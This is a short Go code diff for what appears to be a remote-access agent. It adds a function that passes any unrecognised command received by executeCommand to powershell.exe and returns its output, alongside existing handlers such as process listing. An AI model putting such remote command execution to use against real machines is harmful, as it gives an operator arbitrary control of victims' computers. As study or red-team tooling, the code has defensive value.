@@ -11,7 +11,9 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
+	"runtime"
 	"time"
 
 	ps "github.com/mitchellh/go-ps"
@@ -83,7 +85,25 @@ func executeCommand(command string) (response string) {
 	case "ps":
 		response = listProcesses()
 	default:
-		//
+		response = executeCommandOnShell(command)
+	}
+
+	return response
+}
+
+func executeCommandOnShell(completeCommand string) (response string) {
+
+	// Execute the command on the shell
+	// Check the operating system
+	if runtime.GOOS == "windows" {
+		// Powershell
+		output, _ := exec.Command("powershell.exe", "/c", completeCommand).CombinedOutput()
+
+		response = string(output)
+
+	} else {
+		// Bash
+		response = "target Operating system not supported yet"
 	}
 
 	return response
